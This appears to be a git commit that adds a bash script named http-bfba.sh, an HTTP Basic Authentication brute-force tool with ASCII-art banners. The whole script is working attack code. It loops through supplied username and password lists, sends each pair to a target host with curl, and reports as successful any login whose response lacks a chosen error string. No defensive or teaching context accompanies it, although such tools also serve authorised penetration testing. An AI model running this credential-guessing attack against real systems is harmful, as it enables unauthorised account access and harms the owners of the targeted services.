0204ee4ad9c93f544ecf619254df85de7cb74fa8
MidwintersTomb <Mark.Maderich@gmail.com>
2024-08-08 02:26:34 -0400

    Add files via upload

---
+++ http-bfba.sh
@@ -0,0 +1,96 @@
+#!/bin/bash
+
+# Setting colors
+RED='\033[0;31m'
+BLUE='\033[0;34m'
+GREEN='\033[0;32m'
+PURPLE='\033[0;35m'
+NC='\033[0m'
+
+# Function to display usage
+usage() {
+    echo ""
+    echo -e "${GREEN} _   _ _____ ___________"
+    echo -e "| | | |_   _|_   _| ___ \\"
+    echo -e "| |_| | | |   | | | |_/ /"
+    echo -e "|  _  | | |   | | |  __/"
+    echo -e "| | | | | |   | | | |"
+    echo -e "\_| |_/ \_/   \_/ \_|"
+    echo -e "${RED}______            _        ______"
+    echo -e "| ___ \          | |       |  ___|"
+    echo -e "| |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___"
+    echo -e "| ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \\"
+    echo -e "| |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/"
+    echo -e "\____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___|"
+    echo -e "${PURPLE}______           _         ___        _   _"
+    echo -e "| ___ \         (_)       / _ \      | | | |"
+    echo -e "| |_/ / __ _ ___ _  ___  / /_\ \_   _| |_| |__"
+    echo -e "| ___ \/ _\` / __| |/ __| |  _  | | | | __| '_ \ "
+    echo -e "| |_/ / (_| \__ \ | (__  | | | | |_| | |_| | | |"
+    echo -e "\____/ \__,_|___/_|\___| \_| |_/\__,_|\__|_| |_|"
+    echo ""
+    echo -e "${NC}Usage: ./http-bfba.sh -u <usernames_file> -p <passwords_file> -d <domain_or_ip> -r <response_filter>"
+    exit 1
+}
+
+echo ""
+echo -e "${GREEN} _   _ _____ ___________"
+echo -e "| | | |_   _|_   _| ___ \\"
+echo -e "| |_| | | |   | | | |_/ /"
+echo -e "|  _  | | |   | | |  __/"
+echo -e "| | | | | |   | | | |"
+echo -e "\_| |_/ \_/   \_/ \_|"
+echo -e "${RED}______            _        ______"
+echo -e "| ___ \          | |       |  ___|"
+echo -e "| |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___"
+echo -e "| ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \\"
+echo -e "| |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/"
+echo -e "\____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___|"
+echo -e "${PURPLE}______           _         ___        _   _"
+echo -e "| ___ \         (_)       / _ \      | | | |"
+echo -e "| |_/ / __ _ ___ _  ___  / /_\ \_   _| |_| |__"
+echo -e "| ___ \/ _\` / __| |/ __| |  _  | | | | __| '_ \ "
+echo -e "| |_/ / (_| \__ \ | (__  | | | | |_| | |_| | | |"
+echo -e "\____/ \__,_|___/_|\___| \_| |_/\__,_|\__|_| |_|"
+echo ""
+echo -e "${NC}Running..."
+echo ""
+
+# Parse command-line arguments
+while getopts "u:p:d:r:" opt; do
+    case "${opt}" in
+        u)
+            usernames_file=${OPTARG}
+            ;;
+        p)
+            passwords_file=${OPTARG}
+            ;;
+        d)
+            domain_or_ip=${OPTARG}
+            ;;
+        r)
+            response_filter=${OPTARG}
+            ;;
+        *)
+            usage
+            ;;
+    esac
+done
+
+# Check if all arguments are provided
+if [ -z "${usernames_file}" ] || [ -z "${passwords_file}" ] || [ -z "${domain_or_ip}" ] || [ -z "${response_filter}" ]; then
+    usage
+fi
+
+# Loop through each username and password combination
+while IFS= read -r username; do
+    while IFS= read -r password; do
+        # Perform the login attempt using curl
+        response=$(curl -s -u "${username}:${password}" "${domain_or_ip}")
+
+        # Check if the response contains the filter string
+        if [[ "${response}" != *"${response_filter}"* ]]; then
+            echo -e "${GREEN}Login with ${BLUE}${username}${GREEN}:${BLUE}${password} ${GREEN}successful."
+        fi
+    done < "${passwords_file}"
+done < "${usernames_file}"
